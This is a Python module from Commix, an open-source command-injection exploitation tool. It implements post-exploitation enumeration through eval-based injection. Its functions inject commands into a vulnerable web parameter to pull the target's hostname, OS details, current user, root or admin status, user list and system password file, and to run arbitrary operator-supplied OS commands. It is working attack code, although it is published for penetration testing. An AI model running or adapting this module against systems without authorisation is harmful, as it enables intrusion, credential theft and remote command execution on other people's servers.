#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of Commix Project (https://commixproject.com).
Copyright (c) 2014-2023 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.
 
For more see the file 'readme/COPYING' for copying permission.
"""

import re
import sys
from src.utils import logs
from src.utils import menu
from src.utils import settings
from src.utils import session_handler
from src.core.injections.controller import checks
from src.thirdparty.colorama import Fore, Back, Style, init
from src.core.requests import requests
from src.core.injections.results_based.techniques.eval_based import eb_injector

"""
The dynamic code evaluation (aka eval-based) technique.
"""

"""
Powershell's version number enumeration (for Windows OS)
"""
def powershell_version(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, timesec): 
  _ = False
  cmd = settings.PS_VERSION
  if alter_shell:
    cmd = checks.escape_single_quoted_cmd(cmd)
  else:
    cmd = cmd = checks.quoted_cmd(cmd)
  # Evaluate injection results.
  if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None or menu.options.ignore_session:
    # Command execution results.
    response = eb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
    # Perform target page reload (if it is required).
    if settings.URL_RELOAD:
      response = requests.url_reload(url, timesec)
    # Evaluate injection results.
    ps_version = eb_injector.injection_results(response, TAG, cmd)
    ps_version = "".join(str(p) for p in ps_version).replace(settings.SINGLE_WHITESPACE, "", 1)
    session_handler.store_cmd(url, cmd, ps_version, vuln_parameter)
  else:
    ps_version = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
  checks.print_ps_version(ps_version, filename, _)

"""
Hostname enumeration
"""
def hostname(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, timesec):
  _ = False
  if settings.TARGET_OS == "win":
    settings.HOSTNAME = settings.WIN_HOSTNAME 
  cmd = settings.HOSTNAME
  if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None or menu.options.ignore_session:
    # Command execution results.
    response = eb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
    # Perform target page reload (if it is required).
    if settings.URL_RELOAD:
      response = requests.url_reload(url, timesec)
    # Evaluate injection results.
    shell = eb_injector.injection_results(response, TAG, cmd)
    shell = "".join(str(p) for p in shell).replace(settings.SINGLE_WHITESPACE, "", 1)
    session_handler.store_cmd(url, cmd, shell, vuln_parameter)
  else:
    shell = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
  checks.print_hostname(shell, filename, _)

"""
Retrieve system information
"""
def system_information(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, timesec):
  _ = False     
  if settings.TARGET_OS == "win":
    settings.RECOGNISE_OS = settings.WIN_RECOGNISE_OS
  cmd = settings.RECOGNISE_OS        
  if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None or menu.options.ignore_session:
    # Command execution results.
    response = eb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
    # Perform target page reload (if it is required).
    if settings.URL_RELOAD:
      response = requests.url_reload(url, timesec)
    # Evaluate injection results.
    target_os = eb_injector.injection_results(response, TAG, cmd)
    target_os = "".join(str(p) for p in target_os)
    session_handler.store_cmd(url, cmd, target_os, vuln_parameter)
  else:
    target_os = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
  if target_os:
    target_os = "".join(str(p) for p in target_os)
    if settings.TARGET_OS != "win":
      cmd = settings.DISTRO_INFO
      if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None or menu.options.ignore_session:
        # Command execution results.
        response = eb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
        # Perform target page reload (if it is required).
        if settings.URL_RELOAD:
          response = requests.url_reload(url, timesec)
        # Evaluate injection results.
        distro_name = eb_injector.injection_results(response, TAG, cmd)
        distro_name = "".join(str(p) for p in distro_name)
        if len(distro_name) != 0:
          target_os = target_os + settings.SINGLE_WHITESPACE + distro_name
        session_handler.store_cmd(url, cmd, target_os, vuln_parameter)
      else:
        target_os = session_handler.export_stored_cmd(url, cmd, vuln_parameter)

    if settings.TARGET_OS == "win":
      cmd = settings.WIN_RECOGNISE_HP
    else:
      cmd = settings.RECOGNISE_HP
    if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None or menu.options.ignore_session:
      # Command execution results.
      response = eb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
      # Perform target page reload (if it is required).
      if settings.URL_RELOAD:
        response = requests.url_reload(url, timesec)
      # Evaluate injection results.
      target_arch = eb_injector.injection_results(response, TAG, cmd)
      target_arch = "".join(str(p) for p in target_arch).replace(settings.SINGLE_WHITESPACE, "", 1)
      session_handler.store_cmd(url, cmd, target_arch, vuln_parameter)
    else:
      target_arch = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
  checks.print_os_info(target_os, target_arch, filename, _)
    
"""
The current user enumeration
"""
def current_user(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, timesec):
  _ = False
  cmd = settings.CURRENT_USER
  if settings.TARGET_OS == "win":
    cmd = settings.WIN_CURRENT_USER
    # cmd = cmd + settings.WIN_REPLACE_WHITESPACE
    if alter_shell:
      cmd = checks.escape_single_quoted_cmd(cmd)
    else:  
      cmd = checks.quoted_cmd(cmd)  
  if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None or menu.options.ignore_session:
    # Command execution results.
    response = eb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
    # Perform target page reload (if it is required).
    if settings.URL_RELOAD:
      response = requests.url_reload(url, timesec)
    # Evaluate injection results.
    cu_account = eb_injector.injection_results(response, TAG, cmd)
    cu_account = "".join(str(p) for p in cu_account).replace(settings.SINGLE_WHITESPACE, "", 1)
    session_handler.store_cmd(url, cmd, cu_account, vuln_parameter)
  else:
    cu_account = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
  checks.print_current_user(cu_account, filename, _)

"""
Check if the current user has excessive privileges.
"""
def check_current_user_privs(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, timesec):
  _ = False
  if settings.TARGET_OS == "win":
    cmd = settings.IS_ADMIN
    if not alter_shell:
      cmd = cmd = checks.quoted_cmd(cmd) 
  else:  
    cmd = settings.IS_ROOT 
  if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None or menu.options.ignore_session:
    # Command execution results.
    response = eb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
    # Perform target page reload (if it is required).
    if settings.URL_RELOAD:
      response = requests.url_reload(url, timesec)
    # Evaluate injection results.
    shell = eb_injector.injection_results(response, TAG, cmd)
    shell = "".join(str(p) for p in shell).replace(settings.SINGLE_WHITESPACE, "", 1)
    session_handler.store_cmd(url, cmd, shell, vuln_parameter)
  else:
    shell = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
  checks.print_current_user_privs(shell, filename, _)

"""
System users enumeration
"""
def system_users(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, timesec): 
  _ = False
  cmd = settings.EVAL_SYS_USERS     
  if settings.TARGET_OS == "win":
    cmd = settings.WIN_SYS_USERS
    if alter_shell:
      cmd = checks.escape_single_quoted_cmd(cmd)
    else:  
      cmd = checks.quoted_cmd(cmd)                 
  if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None or menu.options.ignore_session:
    # Command execution results.
    response = eb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
    # Perform target page reload (if it is required).
    if settings.URL_RELOAD:
      response = requests.url_reload(url, timesec)
    # Evaluate injection results.
    sys_users = eb_injector.injection_results(response, TAG, cmd)
    sys_users = "".join(str(p) for p in sys_users)
    session_handler.store_cmd(url, cmd, sys_users, vuln_parameter)
  else:
    sys_users = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
  checks.print_users(sys_users, filename, _, separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell)
      
"""
System passwords enumeration
"""
def system_passwords(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, timesec):  
  _ = False       
  cmd = settings.SYS_PASSES            
  if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None or menu.options.ignore_session:
    # Command execution results.
    response = eb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
    # Perform target page reload (if it is required).
    if settings.URL_RELOAD:
      response = requests.url_reload(url, timesec)
    # Evaluate injection results.
    sys_passes = eb_injector.injection_results(response, TAG, cmd)
    sys_passes = "".join(str(p) for p in sys_passes)
    session_handler.store_cmd(url, cmd, sys_passes, vuln_parameter)
  else:
    sys_passes = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
  checks.print_passes(sys_passes, filename, _, alter_shell)

"""
Single os-shell execution
"""
def single_os_cmd_exec(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, timesec):
  cmd = menu.options.os_cmd
  checks.print_enumenation().print_single_os_cmd_msg(cmd)
  if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None or menu.options.ignore_session:
    # Command execution results.
    response = eb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
    # Perform target page reload (if it is required).
    if settings.URL_RELOAD:
      response = requests.url_reload(url, timesec)
    # Evaluate injection results.
    shell = eb_injector.injection_results(response, TAG, cmd)
    shell = "".join(str(p) for p in shell).replace(settings.SINGLE_WHITESPACE, "", 1)
    session_handler.store_cmd(url, cmd, shell, vuln_parameter)
  else:
    shell = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
  checks.print_single_os_cmd(cmd, shell) 

"""
Check the defined options
"""
def do_check(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, timesec):
  # Check if PowerShell is enabled.
  if not menu.options.ps_version and settings.TARGET_OS == "win":
    checks.ps_check()

  if menu.options.ps_version and settings.PS_ENABLED == None:
    if not checks.ps_incompatible_os():
      checks.print_enumenation().ps_version_msg()
      powershell_version(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, timesec)
      settings.ENUMERATION_DONE = True

  if menu.options.hostname:
    checks.print_enumenation().hostname_msg()
    hostname(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, timesec)
    settings.ENUMERATION_DONE = True
    
  if menu.options.current_user:
    checks.print_enumenation().current_user_msg()
    current_user(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, timesec)
    settings.ENUMERATION_DONE = True

  if menu.options.is_root or menu.options.is_admin:
    checks.print_enumenation().check_privs_msg()
    check_current_user_privs(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, timesec)
    settings.ENUMERATION_DONE = True

  if menu.options.sys_info:
    checks.print_enumenation().os_info_msg()
    system_information(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, timesec)
    settings.ENUMERATION_DONE = True

  if menu.options.users:
    checks.print_enumenation().print_users_msg()
    system_users(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, timesec)
    settings.ENUMERATION_DONE = True

  if menu.options.passwords:
    if settings.TARGET_OS == "win":
      check_option = "--passwords"
      checks.unavailable_option(check_option)
    else:
      checks.print_enumenation().print_passes_msg()
      system_passwords(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, timesec)
    settings.ENUMERATION_DONE = True

# eof